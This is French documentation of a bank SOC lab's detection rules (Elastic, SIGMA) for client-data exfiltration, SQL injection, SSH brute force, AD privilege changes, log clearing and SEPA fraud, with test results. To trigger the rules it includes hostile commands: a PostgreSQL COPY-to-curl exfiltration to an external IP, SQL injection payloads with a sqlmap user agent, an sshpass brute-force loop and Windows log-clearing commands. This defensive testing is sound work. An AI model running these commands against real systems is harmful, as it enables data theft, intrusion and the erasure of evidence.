# Use case groupe 3 : exfiltration de données clients

Azur Bank, base `core_clients` (PostgreSQL + pgaudit, zone Datacenter), Elastic Security 9.7.

## Fiche de la règle principale

| Élément | Valeur |
|---|---|
| Nom | Lecture massive base clients (`azur-bank-client-data-exfil`) |
| Objectif | Détecter un compte qui lit un volume anormal de fiches clients en peu de temps |
| Risque | Fuite de données personnelles et bancaires (RGPD, PCI DSS si données de carte), compte interne compromis ou malveillant |
| Sources | Audit PostgreSQL du serveur db-clients (`logs-db.audit-*`), corrélé avec le bastion (`logs-bastion.auth-*`) |
| Seuil / fenêtre | 500 lectures ou plus de la table `clients` par `user.name` sur 10 minutes |
| Exécution | Toutes les minutes, sur les 10 dernières minutes (fenêtre glissante) |
| Action | Alerte dans Security > Alerts, puis playbook SOAR Shuffle. Automatique toujours : enrichissement, ouverture du Case, notification N2. Automatique seulement si l'alerte est critique (lecture massive + export vers une IP externe) : rôle PostgreSQL en `NOLOGIN` et sessions coupées (coupe-circuit réversible). Sur validation de l'analyste (un clic) : désactivation du compte AD et blocage de l'IP sur fw-01. Dans le lab, le mode démonstration enchaîne tout sans clic pour mesurer le temps total |
| Priorité | Élevée (risk score 73). Critique (99) si un export suit |
| MITRE ATT&CK | Collection TA0009 / T1530 (énoncé), Exfiltration TA0010. Variante séquence : T1048.002 |

## Les règles livrées

| Fichier | Type | Ce qu'elle détecte | Sévérité |
|---|---|---|---|
| `regles/sigma/lecture_massive_clients.yml` | SIGMA v2 (règle de base + corrélation `event_count`) | > 500 lectures `clients` par compte en 10 min | high |
| `regles/sigma/lecture_massive_clients_enonce.yml` | SIGMA, syntaxe de l'énoncé | Idem, conservée pour référence | high |
| `regles/elastic/threshold_lecture_massive_clients.json` | Threshold (KQL) | ≥ 500 lectures `clients` par `user.name` en 10 min | high |
| `regles/elastic/eql_lecture_puis_export.json` | EQL sequence | 100 lectures `clients` puis un export, même compte, en 10 min | critical |
| `regles/elastic/esql_lecture_puis_export.json` | ES\|QL | > 500 lectures `clients` puis au moins un export, même compte, en 10 min | critical |
| `regles/elastic-basic/` | Mêmes règles | Variante pour l'instance on-prem en licence Basic (sans suppression d'alertes) ; les deux dossiers contiennent les 10 règles | |
| `regles/elastic/query_swift_virement_anormal.json`, `regles/elastic-basic/query_swift_virement_anormal.json` + `regles/sigma/swift_virement_anormal.yml` | Query (KQL) + SIGMA | MT103/MT202 sortant ≥ 1 M EUR, correspondant hors référentiel ou hors heures ouvrées (passerelle SWIFT via Logstash) | critical |
| `regles/elastic/threshold_portail_sqli.json`, `regles/elastic-basic/threshold_portail_sqli.json` + `regles/sigma/portail_sqli.yml` | Threshold (KQL) + SIGMA (corrélation `event_count`) | ≥ 10 requêtes nginx avec charge d'injection SQL ou `sqlmap` par `source.ip` en 5 min (T1190) | high |
| `regles/elastic/eql_bastion_brute_force.json`, `regles/elastic-basic/eql_bastion_brute_force.json` + `regles/sigma/bastion_brute_force.yml` | EQL sequence + SIGMA (corrélation `temporal_ordered`) | ≥ 10 échecs puis un succès d'authentification, même IP et même compte, en 10 min (T1110.001) | critical |
| `regles/elastic/query_ad_groupe_privilegie.json`, `regles/elastic-basic/query_ad_groupe_privilegie.json` + `regles/sigma/ad_ajout_groupe_privilegie.yml` | Query (KQL) + SIGMA | Ajout d'un compte à un groupe privilégié AD (4728, 4732, 4756 ; noms anglais et français) (T1098.007, PCI DSS 10.2.1.5) | high |
| `regles/elastic/query_effacement_journal_windows.json`, `regles/elastic-basic/query_effacement_journal_windows.json` + `regles/sigma/windows_effacement_journal.yml` | Query (KQL) + SIGMA (2 documents) | Effacement d'un journal Windows : 1102 (Sécurité) ou 104 (System, Application...) (T1685.005, PCI DSS 10.3.2) | high |
| `regles/elastic/esql_admin_hors_horaires.json`, `regles/elastic-basic/esql_admin_hors_horaires.json` + `regles/sigma/admin_connexion_interactive.yml` | ES\|QL + SIGMA | Connexion réussie d'un compte d'administration (console/RDP Windows ou SSH bastion) le week-end ou hors 7h-20h, heure de Paris (T1078.002, PCI DSS 10.2.1.2) | medium |
| `regles/elastic/query_sepa_virement_anormal.json`, `regles/elastic-basic/query_sepa_virement_anormal.json` + `regles/sigma/sepa_virement_anormal.yml` | Query (KQL) + SIGMA | Virement SEPA sortant hors norme : SCT ≥ 100 000 €, SCT Inst ≥ 15 000 €, nouveau bénéficiaire ≥ 10 000 €, ou SCT Inst ≥ 10 000 € hors heures ouvrées (T1657, DSP2 RTS art. 2) | high |

Requête KQL de la règle Threshold :

```
event.dataset : "db.audit" and event.action : "select" and object : "clients"
```

Séquence EQL :

```
sequence by user.name with maxspan=10m
  [any where event.dataset == "db.audit" and event.action == "select" and object == "clients"] with runs=100
  [any where event.dataset == "db.audit" and event.action == "export"]
```

## Écarts avec l'énoncé et justification

1. **Syntaxe SIGMA.** La condition `reads | count(user.name) > 500` utilise l'ancienne syntaxe d'agrégation, retirée de la spécification. `sigma convert` la refuse : « The pipe syntax in Sigma conditions has been deprecated and replaced by Sigma correlations ». La version livrée utilise une règle de corrélation SIGMA v2 (`type: event_count`, `group-by: user.name`, `timespan: 10m`, `gt: 500`). Elle passe `sigma check` sans erreur et se convertit en EQL et ES|QL avec pySigma (backend Elasticsearch).
2. **`with runs=500` en EQL.** Elasticsearch refuse la requête : `parsing_exception: A query cannot be repeated more than 100 times; found [500]`. La séquence EQL utilise donc `runs=100` (signal « lecture en rafale puis export »). Le seuil exact de 500 est porté par la règle Threshold et par la règle ES|QL, qui compte les lectures puis vérifie l'export.
3. **MITRE.** T1530 appartient à la tactique Collection (TA0009) dans ATT&CK. Les règles gardent les deux tags de l'énoncé (T1530 et TA0010) avec un mapping valide : TA0009/T1530 + TA0010, et T1048.002 pour l'export chiffré vers une IP externe.
4. **Fréquence d'exécution.** Une règle Threshold compte sur toute sa fenêtre d'analyse, pas sur une fenêtre glissante. Avec l'exécution par défaut (toutes les 5 min), une rafale de 8 min peut être coupée en deux et passer sous le seuil. La règle tourne donc toutes les minutes sur 10 min, avec une suppression des doublons sur 30 min. La suppression d'alertes demande une licence Platinum : en licence Basic (instance on-prem, `elastic-basic/`), on s'en passe. La règle Threshold ne réalerte pas sur les événements déjà comptés, et l'EQL ne recrée pas une séquence déjà signalée. L'ES|QL, elle, réalertait à chaque minute tant que l'export restait dans la fenêtre de 10 min (3 alertes au premier essai) : la variante Basic ne garde que l'export tombé dans l'avant-dernière minute. Testé le 6 novembre : une alerte par règle pour une exfiltration.

## Preuve de déclenchement (5 novembre 2026)

Jeu de données : 3644 événements `db.audit`, 3060 `nginx.access`, 647 `bastion.auth`.

Activité du compte c.dupont (IP 10.20.30.47) :
- 603 lectures de `clients` entre 14:01:08 et 14:09:06 UTC (environ 75 par minute) ;
- 1 export à 14:09:27 UTC : `COPY clients TO PROGRAM 'curl -T - https://185.220.101.34/u'`, destination 185.220.101.34:443. C'est le seul export de l'index.

Exécution manuelle des 3 règles sur 13:46 à 14:24 UTC :

| Règle | Compte | Sévérité | Détail |
|---|---|---|---|
| Lecture massive base clients (Threshold) | c.dupont | high | 528 lectures comptées depuis 14:01:08 |
| Lecture massive base clients puis export (ES\|QL) | c.dupont | critical | 603 lectures, 1 export, 10.20.30.47 vers 185.220.101.34 |
| Lecture massive base clients puis export (EQL) | c.dupont | critical | 1 alerte de séquence (100 lectures + export), 99 alertes « building block » masquées par défaut |

Aucun autre compte ne dépasse le seuil : le deuxième plus gros lecteur de `clients` sur 24 h (j.leroy) en fait 169 sur toute la journée.

## Déploiement

```
cd "projet-elastic/03 - Détection (use case et règles)/regles/scripts"
export ES_URL=https://<projet>.es.<region>.elastic.cloud:443
export ES_API_KEY=...          # jamais dans un fichier
python3 regles.py check        # données, fenêtre de l'exfiltration, EQL, ES|QL
python3 regles.py deploy       # crée ou met à jour les règles de ../elastic
python3 regles.py run 2026-11-05T13:46:00.000Z 2026-11-05T14:25:00.000Z
python3 regles.py alerts
```

Pour une démo en direct : `python3 ../../scripts/gen_logs_banque.py --attack-now` (depuis `regles/scripts`), puis attendre une à deux minutes.

## Limites et pistes

- En production, l'agent doit extraire `event.action` et `object` des lignes pgaudit (pipeline d'ingestion). Sans ces champs, les règles ne voient rien.
- Le champ `object` n'est pas un champ ECS. On pourrait le remplacer par `db.table` ou un champ personnalisé `azurbank.db.object`.
- Exclure les comptes de service batch (CRM, reporting) par une exception, pour limiter les faux positifs.
- Évolution possible : remplacer le seuil fixe par une règle Machine Learning sur le volume de lecture habituel de chaque compte.

## Règles bonus : injection SQL et force brute (6 novembre)

Les deux scénarios des données de démonstration (`sqlmap` depuis 45.146.165.37 sur le portail, force brute depuis
91.240.118.172 sur `adm.fontaine`) ont maintenant leur règle, et les deux règles visent aussi les vraies données du lab :
`logs-nginx.access-*` (intégration Nginx de web-portail-01) et `logs-system.auth-*` (sshd de bastion-01).

Tests sur le lab, depuis bastion-01 :

```bash
# 16 requêtes d'injection avec l'empreinte de sqlmap
UA="sqlmap/1.8.11#stable (https://sqlmap.org)"
for p in "compte/operations?id=1%27%20OR%20%271%27=%271" "api/v1/comptes?id=1%20UNION%20SELECT%20null,iban,null%20FROM%20clients--" \
         "login?user=admin%27--" "compte/solde?id=1;DROP%20TABLE%20clients"; do
  for i in 1 2 3 4; do curl -s -o /dev/null -A "$UA" "http://10.30.0.10/$p"; done; done
# 12 mauvais mots de passe puis le bon, en SSH sur adm.fontaine
for i in $(seq 1 12); do SSHPASS=mauvais$i sshpass -e ssh -o PubkeyAuthentication=no adm.fontaine@127.0.0.1 true; done
sshpass -p '<MOT_DE_PASSE_LAB>' ssh -o PubkeyAuthentication=no adm.fontaine@127.0.0.1 true
```

Résultat : une alerte « Injection SQL sur le portail clients » sur 10.0.5.10, et une alerte « Force brute réussie sur le
bastion » sur `adm.fontaine` (avec ses 11 événements « building block »). OpenSSH 10 (Debian 13) pénalise une IP après
plusieurs échecs (`PerSourcePenalties`) : la connexion réussie peut demander une deuxième tentative quelques secondes plus tard.
C'est d'ailleurs une bonne protection à citer face à la force brute.

## Règles Active Directory et comptes à privilèges (13 novembre)

Trois règles ajoutées, chacune en SIGMA et en règle native (`elastic/` avec suppression des doublons 30 min par
`host.name` et `user.name`, `elastic-basic/` sans). Les trois SIGMA passent `sigma check` (pySigma, ATT&CK v20).

| Règle (`rule_id`) | Type | Logique | Sévérité | MITRE | PCI DSS |
|---|---|---|---|---|---|
| Ajout à un groupe privilégié Active Directory (`azur-bank-ad-groupe-privilegie`) | Query (KQL) | `event.code` 4728, 4732 ou 4756 et groupe (`group.name` ou `winlog.event_data.TargetUserName`) parmi Admins du domaine, Administrateurs de l'entreprise, Administrateurs du schéma, Administrateurs, Opérateurs de compte, Opérateurs de sauvegarde (noms anglais et français) | high (73) | TA0003, TA0004 / T1098.007 | 10.2.1.5 |
| Effacement d'un journal d'événements Windows (`azur-bank-effacement-journal`) | Query (KQL) | `event.code : "1102"`, ou `104` émis par `Microsoft-Windows-Eventlog` | high (73) | TA0112 / T1685.005 | 10.3.2 |
| Connexion d'un compte administrateur hors heures ouvrées (`azur-bank-admin-hors-horaires`) | ES\|QL | Connexion réussie (4624 LogonType 2 ou 10, ou `ssh_login` du bastion) d'un compte `adm.*`, `Administrateur` ou `Administrator`, le week-end ou avant 7 h / après 20 h, heure de Paris | medium (47) | TA0001, TA0004 / T1078.002 | 10.2.1.2 |

Points vérifiés dans les données du lab avant le déploiement :

- 4728/4732/4756 : `group.name` et `winlog.event_data.TargetUserName` contiennent tous deux le nom du groupe, `user.target.name` le compte ajouté, `user.name` l'auteur.
- 4624 : `winlog.event_data.LogonType` est une chaîne (`"2"`, `"10"`) ; `user.name` est le compte qui se connecte.
- bastion-01 : `event.action : "ssh_login"` avec `event.outcome : "success"` dans `logs-system.auth-*`.
- 104 : dataset `system.system`, `winlog.provider_name : "Microsoft-Windows-Eventlog"`, `winlog.channel : "System"`, sans `user.name`.
- ES|QL : `DATE_EXTRACT("day_of_week", ...)` renvoie 1 pour lundi et 7 pour dimanche (vendredi 13/11 = 5), donc `jour >= 6` = week-end. L'heure de Paris est approchée par mois (avril à octobre UTC+2, sinon UTC+1) : les jours de changement d'heure peuvent être décalés d'une heure.
- MITRE : depuis ATT&CK v20, « Clear Windows Event Logs » est T1685.005 (tactique Defense Impairment, TA0112), anciennement T1070.001 (Defense Evasion). `sigma check` refuse l'ancien tag ; Kibana affiche le nouveau.

Sur l'historique, la règle ES|QL trouve un vrai cas : `Administrateur` en console sur srv-dc01 le samedi 7/11 à 00:31 (heure de Paris).

### Tests sur le lab (13 novembre, heures UTC)

Les règles `elastic-basic/` sont déployées sur le SIEM du lab (licence Basic) ; aucune n'a d'action, et le playbook
Shuffle ne lit que les règles exfiltration et SWIFT.

**1. Ajout aux Admins du domaine** (srv-dc01, PowerShell via `qm guest exec`) :

```powershell
# mot de passe aléatoire généré en mémoire, jamais écrit ni affiché
New-ADUser -Name test.soc -SamAccountName test.soc -AccountPassword $sec -Enabled $true
$g = Get-ADGroup -Identity ("{0}-512" -f (Get-ADDomain).DomainSID.Value)   # Admins du domaine
Add-ADGroupMember -Identity $g -Members test.soc                            # 15:40:43
# après l'alerte
Remove-ADGroupMember -Identity $g -Members test.soc -Confirm:$false; Remove-ADUser test.soc -Confirm:$false   # 16:10:07
```

Résultat : OK. Alerte « Ajout à un groupe privilégié Active Directory » à 15:44:28 (high), événement 4728 de 15:40:43,
compte ajouté `test.soc`, groupe « Admins du domaine », hôte srv-dc01. Le compte a ensuite été retiré du groupe et supprimé
(membres restants : Administrateur, adm.fontaine).

**2. Effacement des journaux** (srv-dc01) :

```
wevtutil cl System      # 16:10:22 -> événement 104
wevtutil cl Security    # 16:10:46 -> événement 1102, lancé après avoir vérifié que Security était indexé jusqu'à 16:10:22
```

Résultat : OK. Deux alertes « Effacement d'un journal d'événements Windows » à 16:14:28 (high) : une pour le 104 (16:10:22),
une pour le 1102 (16:10:46, compte « Système », car la commande passe par l'agent invité). Les événements effacés étaient
déjà dans le SIEM : l'effacement local ne fait rien perdre à l'enquête.

**3. Connexion administrateur hors heures ouvrées** : faute de connexion réelle à 2 h du matin, un SSH réussi de
`adm.fontaine` sur bastion-01 daté du 13/11 à 01:13 UTC (02:13 à Paris) est écrit dans un data stream de test
`logs-system.auth-test` (connecteur Kibana « Index » temporaire), puis la règle est lancée à la main sur 01:00-01:30
(API `_bulk_action` avec `action: run` sur cette seule règle ; `regles.py run 2026-11-13T01:00:00.000Z 2026-11-13T01:30:00.000Z` fait la même chose pour toutes les règles).

- Test positif : OK. Alerte « Connexion d'un compte administrateur hors heures ouvrées » à 16:11:25 (medium), `adm.fontaine`, bastion-01, `heure` = 2, `jour` = 5.
- Test négatif : OK. Le même SSH daté de 16:11:39 (17:11 à Paris, vendredi) passe tous les filtres sauf la plage horaire ; l'exécution planifiée de 16:14:31 (fenêtre 16:08:31-16:14:31) n'a produit aucune alerte. Même chose sur l'historique : la connexion réelle d'adm.fontaine du vendredi 6/11 à 19:54 (Paris) n'est pas retenue.
- Le data stream de test a été supprimé ensuite.

Effets de bord : aucun Case SOAR créé, aucun compte ni IP touché par Shuffle.

Captures : `captures/alerte-ad-groupe-privilegie-test.soc.png`, `captures/alerte-effacement-journal-srv-dc01.png`,
`captures/alerte-admin-hors-horaires-adm.fontaine.png`.

## Règle SEPA : virement anormal (14 novembre)

Le seul point de conformité sans règle dédiée était SEPA (« détection d'anomalies sur les flux de paiement »). Le hub de
paiements SEPA est simulé comme la passerelle SWIFT : `sim_sepa.py` sur bastion-01 envoie les virements à Logstash
(pipeline `sepa-transfer`), qui calcule les champs métier et masque les IBAN (voir `../02 - Architecture et infra/INFRA.md`).

| Élément | Valeur |
|---|---|
| Nom | Virement SEPA anormal (`azur-bank-sepa-virement-anormal`) |
| Type | Query (KQL) sur `logs-sepa.transfer-*`, toutes les 5 min ; SIGMA `regles/sigma/sepa_virement_anormal.yml` |
| Sévérité | high (73) |
| MITRE ATT&CK | Impact TA0040 / T1657 (Financial Theft), comme SWIFT |
| Conformité | SEPA, DSP2 : surveillance des opérations (règlement délégué 2018/389, art. 2) |
| Champs | `sepa.scheme` (SCT ou SCT_INST), `sepa.amount_eur`, `sepa.beneficiaire_nouveau`, `sepa.hors_heures_ouvrees`, `sepa.heure_locale`, `user.name` (client), `sepa.creditor.iban_masque`, `sepa.creditor.iban_hash`, `sepa.creditor.bic`, `sepa.creditor.pays` |

Requête :

```
event.dataset : "sepa.transfer" and event.action : "CT_OUT" and (
  (sepa.scheme : "SCT" and sepa.amount_eur >= 100000) or
  (sepa.scheme : "SCT_INST" and sepa.amount_eur >= 15000) or
  (sepa.beneficiaire_nouveau : true and sepa.amount_eur >= 10000) or
  (sepa.scheme : "SCT_INST" and sepa.hors_heures_ouvrees : true and sepa.amount_eur >= 10000))
```

Choix des seuils (banque de détail, à recalibrer sur 3 mois de flux réels) :

- **SCT ≥ 100 000 €** : un virement classique est réglé le jour ouvré suivant et peut encore être bloqué. Au-delà de
  100 000 €, il s'agit d'opérations rares chez un particulier (achat immobilier), qui méritent une vérification.
- **SCT Inst ≥ 15 000 €** : un virement instantané part en 10 secondes et ne se rappelle plus sans l'accord du
  bénéficiaire. Le seuil est donc plus bas. Depuis le règlement (UE) 2024/886, chaque client peut fixer son propre
  plafond d'instantané ; 15 000 € couvre largement l'usage courant d'un particulier.
- **Nouveau bénéficiaire ≥ 10 000 €** : schéma typique de la fraude au faux conseiller ou de la prise de contrôle du
  compte : le fraudeur ajoute son compte (« mule ») et vide le compte dans la foulée.
- **SCT Inst ≥ 10 000 € hors heures ouvrées** : la nuit et le week-end, le client ne peut pas joindre son agence et
  l'équipe fraude est réduite ; c'est là que les fraudeurs frappent.

### Tests sur le lab (heures UTC)

```bash
# sur l'hôte Proxmox, dans bastion-01 (LXC 212)
pct exec 212 -- /usr/local/bin/sim_sepa.py -n 0 --fraude --date 2026-11-13T22:00:00Z          # 23:00 à Paris
pct exec 212 -- /usr/local/bin/sim_sepa.py -n 0 --normal-unique --date 2026-11-13T10:00:00Z   # 11:00 à Paris
# puis exécution manuelle de la règle sur 21:55-22:05 et 09:55-10:05 (API _bulk_action, action run)
```

- Test positif : OK. Virement SCT Inst de 48 000 € du client C104512 vers un compte lituanien jamais utilisé
  (`LT21 **** 1348`, BIC REVOLT21XXX), le 13/11 à 23:00 heure de Paris : `sepa.beneficiaire_nouveau` = true,
  `sepa.hors_heures_ouvrees` = true. Alerte « Virement SEPA anormal » (high, 73) créée le 13/11 à 23:17:36 UTC. Trois des quatre
  conditions sont remplies (Inst ≥ 15 000 €, nouveau bénéficiaire, Inst hors heures).
- Test négatif : OK. Virement SCT de 1 250 € du client C102310 vers un bénéficiaire habituel (`FR46 **** 4387`), le 13/11
  à 11:00 heure de Paris : aucune alerte. Les virements normaux envoyés en direct par le simulateur à 23:16 UTC
  (SCT de 6 400 à 6 700 € vers des bénéficiaires connus) n'ont pas non plus déclenché la règle planifiée.
- Une seule alerte au total pour cette règle ; aucun Case SOAR créé (le playbook Shuffle ne lit pas cette règle).
- Aucun IBAN en clair dans `logs-sepa.transfer-*` : seulement `iban_masque` et `iban_hash`.

Capture : `captures/alerte-sepa-virement-anormal-C104512.png`.
